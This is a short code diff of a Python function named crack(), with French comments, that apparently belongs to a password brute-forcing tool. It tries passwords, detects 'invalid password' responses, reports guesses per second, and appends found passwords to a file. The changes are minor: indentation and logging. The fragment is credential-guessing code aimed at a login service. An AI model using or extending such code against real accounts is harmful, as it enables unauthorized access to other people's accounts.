@@ -87,19 +87,18 @@ def crack(rec):
         t3=int((1/(t2-t1))*18)
         # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
         if "invalid password" in str(r.read()):
-        	if rec==1:
-        		print("login {} || password {} incorrect ||  {}  pass/sec || {} min restant ".format(login,user,t3,t4),end="\r")
-        	else:pass
+            if rec==1:
+                print("login {} || password {} incorrect ||  {}  pass/sec || {} min restant ".format(login,user,t3,t4),end="\r")
+            else:pass
         else :
         	print("password  trouver : {}".format(user))
         	fd=open("pass_found.txt",'a')
-        	fd.write("login :"+login+" || password : "+user+"\n")
+        	fd.write("password : "+user+"\n")
         	fd.close()
         	if number< number2:
         		number+=1
         	elif number>=number2:
         		sys.exit()
-        del r
             
             
 # code spagetti pour booster X18 le programme
